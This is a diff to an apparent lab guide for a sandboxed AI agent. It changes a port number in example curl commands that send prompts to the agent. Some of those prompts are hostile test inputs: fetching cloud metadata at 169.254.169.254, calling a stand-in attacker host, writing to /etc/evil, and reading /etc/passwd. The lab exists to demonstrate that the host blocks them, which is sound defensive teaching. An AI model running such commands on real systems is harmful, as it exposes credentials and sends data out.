@@ -134,7 +134,7 @@ The messages are the tool's choice. What gets through is the host's.
 
 ## Ask curl
 
-Type each prompt into the chat at http://agent.localhost:18180, or run the
+Type each prompt into the chat at http://agent.localhost:28180, or run the
 curl command under it.
 
 **1. Fetch the granted host** 
@@ -149,7 +149,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'fetch http://api.mock-sites.svc/data'
 ```
 
@@ -168,7 +168,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'save http://api.mock-sites.svc/data to page.html'
 ```
 
@@ -191,7 +191,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'curl -s http://169.254.169.254/latest/meta-data/'
 ```
 
@@ -209,7 +209,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'curl -s http://attacker.mock-sites.svc/collect'
 ```
 
@@ -230,7 +230,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'curl -sL http://api.mock-sites.svc/redirect'
 ```
 
@@ -248,7 +248,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'curl -o /etc/evil -s http://api.mock-sites.svc/data'
 ```
 
@@ -267,7 +267,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'curl -s file:///etc/passwd'
 ```
 
@@ -286,7 +286,7 @@ In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
+  http://127.0.0.1:28180/ \
   -d 'curl -s file:///data/page.html'
 ```
 
